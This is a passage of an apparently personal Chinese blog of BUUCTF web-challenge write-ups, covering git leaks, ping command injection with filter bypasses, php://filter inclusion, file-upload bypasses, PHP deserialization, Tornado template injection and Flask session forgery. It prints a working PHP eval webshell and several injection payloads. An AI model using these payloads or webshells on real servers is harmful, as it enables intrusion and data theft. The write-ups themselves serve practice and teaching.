src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416154816094.png" alt="image-20210416154816094"></p><h2 id="git泄露-log"><a href="#git泄露-log" class="headerlink" title="git泄露 log"></a>git泄露 log</h2><p>题目中为git泄露可直接在后缀后加/.git</p><p>也可用dirsearch扫</p><p>用githack进行查看（百度里有几个githack没有办法用，弄了一下午）</p><p>githack要用python2 </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416233409173.png" alt="image-20210416233409173"></p><p>得到一个文件夹进入后用git bash打开</p><p>利用git log可以查看历史提交记录</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416233900025.png"></p><p>看到有init ，add flag，remove flag三次提交记录</p><p>猜测flag在add flag中，用git diff命令对比与add flag的差别，可得到flag；</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416233631773.png" alt="image-20210416233631773"></p><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>查看源码后不存在提示，尝试ping 127.0.0.1</p><p>ping通后再尝试ping 127.0.0.1|ls 看到index.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417000733167.png" alt="image-20210417000733167"></p><p>多次用../查看上级目录 看见有flag文件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417000956928.png" alt="image-20210417000956928"></p><p>尝试查看127.0.0.1|cat ../../../flag</p><p>得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417120814848.png" alt="image-20210417120814848"></p><p>也可以用cat /flag</p><p>题目利用了命令执行</p><p>管道符</p><pre class="language-python" data-language="python"><code class="language-python">1、|（就是按位或），直接执行|后面的语句2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句3、&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假4、&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令5、Linux中  ; 前后都执行，无论前面真假，同&amp;，</code></pre><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>题目是include猜测是文件包含；</p><p>点击tips后跳转到了file=flag.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417122756590.png" alt="image-20210417122756590"></p><p>用php://input时提示</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417122817720.png" alt="image-20210417122817720"></p><p>然后尝试用php://filter</p><p>构造payload</p><p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417122714033.png" alt="image-20210417122714033"></p><p>最后用base64解码就能得到flag</p><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>文件可上传<br>知道文件上传的路径<br>上传文件可以被访问<br>上传文件可以被执行</p><p>进去看到这个界面感觉是一句话木马，然后用菜刀连接</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210105533.png" alt="image-20210417210105533"></p><p>试一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210447264.png" alt="image-20210417210447264"></p><p>连接成功</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210315253.png" alt="image-20210417210315253"></p><p>然后在根目录下发现flag的文件，进入后找到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210429525.png" alt="image-20210417210429525"></p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>进去后看到是个广告页，直接查看源码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418123059855.png" alt="image-20210418123059855"></p><p>发现有个Secret.php，进入之后</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418123139740.png" alt="image-20210418123139740"></p><p>用bp抓包然后先加个Referer: <a href="https://www.sycsecret.com/">https://www.Sycsecret.com</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418124012851.png" alt="image-20210418124012851"></p><p>看到要用Syclover 浏览器</p><p>所以把User-Agent里的内容改成User-Agent: Syclover</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418124154554.png" alt="image-20210418124154554"></p><p>提示要本地访问</p><p>所以加个X-Forwarded-For:127.0.0.1（我下了个fakeip的插件）</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418125120122.png" alt="image-20210418125120122"></p><h4 id="http请求报头"><a href="#http请求报头" class="headerlink" title="http请求报头"></a><strong>http请求报头</strong></h4><p>请求报头通知服务器关于客户端求求的信息，典型的请求头有：</p><p><strong>X-Forwarded-For 是一个 HTTP 扩展头部。用来表示 HTTP 请求端真实 IP。</strong></p><p><strong>Referer：表示这是请求是从哪个URL进来的</strong></p><p>Host：请求的主机名，允许多个域名同处一个IP地址，即虚拟主机</p><p><strong>User-Agent：发送请求的浏览器类型、操作系统等信息</strong></p><p>Accept：客户端可识别的内容类型列表，用于指定客户端接收那些类型的信息</p><p>Accept-Encoding：客户端可识别的数据编码</p><p>Accept-Language：表示浏览器所支持的语言类型</p><p>Connection：允许客户端和服务器指定与请求/响应连接有关的选项，例如这是为Keep-Alive则表示保持连接。</p><p>Transfer-Encoding：告知接收端为了保证报文的可靠传输，对报文采用了什么编码方式。</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>进入后先根据题目试一下?ip=127.0.0.1</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145218124.png" alt="image-20210418145218124"></p><p>再用ls查看发现存在flag.php和index.php两个文件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145306532.png" alt="image-20210418145306532"></p><p>尝试直接查看flag.php发现空格被过滤</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145349850.png" alt="image-20210418145349850"></p><p>绕过空格方式</p><pre class="language-none"><code class="language-none">$&#123;IFS&#125;替换$IFS$1替换$&#123;IFS替换%20替换&lt;和&lt;&gt;重定向符替换%09替换</code></pre><p>$IFS是bash中的内部域分隔符，可以代替空格至于后面的$9数字是可以随意的</p><p>发现利用$IFS$1可以绕过，但flag也被过滤了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145543298.png" alt="image-20210418145543298"></p><p>于是先查看index.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145608672.png" alt="image-20210418145608672"></p><p>百度之后找到一种利用内联的payload</p><pre class="language-none"><code class="language-none">?ip&#x3D;127.0.0.1;cat$IFS$1 &#96;ls&#96;</code></pre><p>将反引号内命令的输出作为输入执行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418150550054.png" alt="image-20210418150550054"></p><p><a href="https://blog.csdn.net/qq_46184013/article/details/107061110">GXYCTF2019]Ping Ping Ping 做题总结_孙得劲的博客-CSDN博客</a></p><p>[<a href="https://blog.csdn.net/qq_42812036/article/details/104297163">GXYCTF2019]Ping Ping Ping {命令执行总结}_昂首下楼梯的博客-CSDN博客</a></p><p>一些其他的绕过方式</p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>进入后是个计算器，查看源码后发现</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424173536708.png" alt="image-20210424173536708"></p><p>查看calc.php看到php代码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424173603735.png" alt="image-20210424173603735"></p><p>看到过滤掉了很多字符</p><p>尝试传入参数发现仅能传入数字</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424174247126.png" alt="image-20210424174247126"></p><p>百度后得知这里设置了waf</p><p>可以利用php在解析字符串时会删除空白符并将某些字符转换为下划线的特性绕过</p><p>所以尝试在num前加空格</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424174652548.png" alt="image-20210424174652548"></p><p>绕过成功</p><p>接下来尝试构造命令得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424175021538.png" alt="image-20210424175021538"></p><p>利用scandir函数可读取目录</p><p>由于/被过滤</p><p>所以利用chr函数绕过</p><p>构造</p><p>[node3.buuoj.cn:26183/calc.php? num=print_r(scandir(chr(47)))](<a href="http://node3.buuoj.cn:26183/calc.php">http://node3.buuoj.cn:26183/calc.php</a>? num=print_r(scandir(chr(47))</p><p>得到</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424175958985.png" alt="image-20210424175958985"></p><p>看到有个f1agg</p><p>利用readfile或者file_get_contents查看这个文件</p><p>? num=print_r(file_get_contents(chr(47).f1agg))</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424180753601.png" alt="image-20210424180753601"></p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>先做个一句话木马，上传后显示</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424222521044.png" alt="image-20210424222521044"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424184048567.png" alt="image-20210424184048567"></p><p>用bp抓包然后修改Content-Type为image/jpeg</p><p>  Content-Type（内容类型），一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件，</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424191606823.png" alt="image-20210424191606823"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424184352223.png" alt="image-20210424184352223"></p><p>放包后又显示不能为php</p><p>百度得知绕过后缀的有文件格式有php,</p><p>,php4,php5,phtml.pht</p><p>试一试</p><p>发现可用phtml绕过</p><p>但又提示</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424184937815.png" alt="image-20210424184937815"></p><p>把文件内容改为</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424191120947.png" alt="image-20210424191120947"></p><p>又提示</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424191418367.png" alt="image-20210424191418367"></p><p>在一句话木马前加个文件头GIF89a(GIF89a图片头文件欺骗)</p><p>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.phtml&quot;<br>Content-Type: image/jpeg</p><p>GIF89a<script language="php"> @eval($_POST["a"]);</script></p><p>上传成功</p><p>猜测上传地址为/upload/</p><p>菜刀连接</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424190843452.png" alt="image-20210424190843452"></p><p>在根目录下找到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424190943560.png" alt="image-20210424190943560"></p><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>文件上传，先传个一句话木马试试</p><p>弹出js，</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424215707910.png" alt="image-20210424215707910"></p><p>看一下源码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424215933835.png" alt="image-20210424215933835"></p><p>把这个事件remove掉</p><p>上传后又提示</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424215102729.png" alt="image-20210424215102729"></p><p>试试改改后缀名，发现phtml可以成功上传</p><p>菜刀连接</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424221314425.png" alt="image-20210424221314425"></p><p>在虚拟终端中利用cat命令找到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424221437332.png" alt="image-20210424221437332"></p><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>根据题目得知有.bak的备份文件，访问一下index.php.bak得到备份文件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424230600364.png" alt="image-20210424230600364"></p><p>代码审计可知要传入key的值与str的值相等，且key只能为数字类型</p><p>因为==是弱类型比较，根据php的性质可传入?key=123</p><p>得到flag</p><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>到payflag的页面发现有两个条件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424234920389.png" alt="image-20210424234920389"></p><p>查看源码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235003731.png" alt="image-20210424235003731"></p><p>抓个包</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235104576.png" alt="image-20210424235104576"></p><p>将user改为1可满足第一个条件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235148397.png" alt="image-20210424235148397"></p><p>之后要以post方式传入一个值令其等于404且不能为纯数字</p><p>所以post password=404a</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235248917.png" alt="image-20210424235248917"></p><p>提示要pay for the flag</p><p>猜测要post进money=100000000</p><p>传入后提示数字过长</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235409212.png" alt="image-20210424235409212"></p><p>采用科学计数法，得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235455547.png" alt="image-20210424235455547"></p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>进入后看起来像是上传一句话木马的题</p><p>先传一个正常的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501165659496.png" alt="image-20210501165659496"></p><p>提示illegal suffix!非法后缀</p><p>改个后缀名试试</p><p>改成.jpg文件后成功绕过，但又提示&lt;? in contents!</p><p>猜测&lt;?被过滤了</p><p>修改后</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501165911275.png" alt="image-20210501165911275"></p><p>最后再加个GIF89a文件头，绕过最后一个exif_imagetype函数的检测</p><p>虽然成功上传了但菜刀无法连接</p><p>百度一下wp</p><p><strong>.user.ini</strong></p><p>　1、auto_prepend_file 在页面顶部加载文件<br>　2、auto_append_file 在页面底部加载文件</p><p>某网站限制不允许上传.php文件，可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。在含有.user.ini的文件夹下要有正常的php文件</p><p>再上传一个.user.ini</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501170533467.png" alt="image-20210501170533467"></p><p>上传后我们访问此目录下的任何一个文件时，都会去包含first.jpg,</p><p>根据其返回的地址用菜刀连接</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501174943263.png" alt="image-20210501174943263"></p><p>找到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501174705927.png" alt="image-20210501174705927"></p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501204543745.png" alt="image-20210501204543745"></p><p>看见file_get_contents(),利用伪协议data://text/plain;base64绕过</p><p>再利用php://filter读取useless内的内容</p><p>解码后</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501183046395.png" alt="image-20210501183046395"></p><p>可知flag在flag.php中</p><p>试图让file=flag.php</p><p>看到unserialize函数，利用php反序列化</p><p>构造payload</p><p>？text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501205224647.png" alt="image-20210501205224647"></p><p>查看源码找到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501205239104.png" alt="image-20210501205239104"></p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>页面中提示有备份文件，御剑扫一遍</p><p>找到存在<a href="http://www.zip/">www.zip</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220739803.png" alt="image-20210501220739803"></p><p>重点在class.php和index.php中</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220822144.png" alt="image-20210501220309908"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220857753.png" alt="image-20210501220857753"></p><p>所以要传入一个select参数，利用反序列化让username=admin</p><p>password=100</p><p>因为username和password两个为private类型</p><p>所以有隐藏的空格符</p><p>select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}&quot;</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220212731.png" alt="image-20210501220212731"></p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>先传个.htaccess文件，为了解析图片码</p><pre class="language-none"><code class="language-none">htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</code></pre><pre class="language-none"><code class="language-none">SetHandler application&#x2F;x-httpd-php &#x2F;&#x2F;该语句作用是让Apache将其他类型文件均以php格式解析</code></pre><p>再传个一句话木马，然后bp抓包</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502142204069.png" alt="image-20210502142204069"></p><p>只有将其改为图片的类型才能成功上传</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502141437234.png" alt="image-20210502141437234"></p><p>根据返回的路径用菜刀连接</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502141422576.png" alt="image-20210502141422576"></p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>进入后代码审计</p><p>先get进两个md5值相等的内容</p><p>md5无法处理数组，会返回NULL，使其相等</p><p>再根据php的特性post进passwd=1234567a绕过if</p><p>获得flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502172416595.png" alt="image-20210502172416595"></p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>从提示可以看出来这个tornado是一个python的模板，在web使用的时候给出了四个文件，可以访问，从提示中和url中可以看出，访问需要文件名+文件签名（长度为32位，计算方式为md5(cookie_secret + md5(filename))）;  flag文件名题目已给出 /fllllllllllag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723131705440.png" alt="image-20210723131705440"></p><p>所以要做的就是要获得到cookie值</p><p>这里是采用模板注入的方式 </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723132903953.png" alt="image-20210723132903953"></p><p>这里可以猜出来存在模板注入漏洞而且应该存在过滤</p><p>然后百度看一下wp</p><pre class="language-none"><code class="language-none">在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象，具体定义可以[参考Tornado官方文档](http:&#x2F;&#x2F;tornado.readthedocs.org&#x2F;en&#x2F;latest&#x2F;guide&#x2F;templates.html#template-syntax)！</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723135655762.png" alt="image-20210723135655762"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723135914756.png" alt="image-20210723135914756"></p><p>所以可以利用这个来读取cookie_secret</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723140608282.png" alt="image-20210723140608282"></p><p>然后对其进行md5加密就能得到flag了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723135951327.png" alt="image-20210723135951327"></p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581">HCTF2018-admin_迷风小白-CSDN博客</a></p><p>注册个账户登录后可以在修改密码页面的源码注释中找到提示</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723145616780.png" alt=" "></p><p>查看可以找到题目源码</p><p><strong>一、 session伪造</strong></p><p>flask中session是存储在客户端cookie中的，也就是存储在本地。flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723164939605.png" alt="image-20210723164939605"></p><p>找到session后利用py脚本进行解码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723163354906.png" alt="image-20210723163354906"></p><p>依照题意可以猜测只有用admin账户登录才能得到flag，所以要伪造session来使我们被认为是admin账户</p><p>重新编码session时需要用到secret_key可以在config.py中找到</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723163710686.png" alt="image-20210723163710686"></p><p>伪造session</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723163828745.png" alt="image-20210723163828745"></p><p>修改后刷新页面得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723164748497.png" alt="image-20210723164748497"></p><p><strong>二：Unicode欺骗</strong></p><p>代码审计可以看出在登录注册和修改密码时都存在用户名的小写转换</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723165801699.png" alt="image-20210723165801699"></p><p>看一下strlower</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723170037720.png" 